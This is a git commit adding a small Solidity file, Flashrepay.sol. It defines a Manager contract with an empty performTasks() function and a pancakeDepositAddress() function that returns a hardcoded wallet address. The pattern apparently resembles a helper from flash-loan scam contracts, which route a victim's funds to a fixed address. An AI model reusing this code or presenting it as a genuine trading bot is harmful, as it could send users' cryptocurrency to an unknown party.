47d24198c8118e4b32f8992492c5c798d6e8ddb0
cryptopath <94839650+Crypopath@users.noreply.github.com>
2021-11-29 17:42:10 +0100

    Create Flashrepay.sol

---
+++ Flashrepay.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xFD3442Ee37645ceFB946a2D40c3d0815deAD9937;
+	}
+}
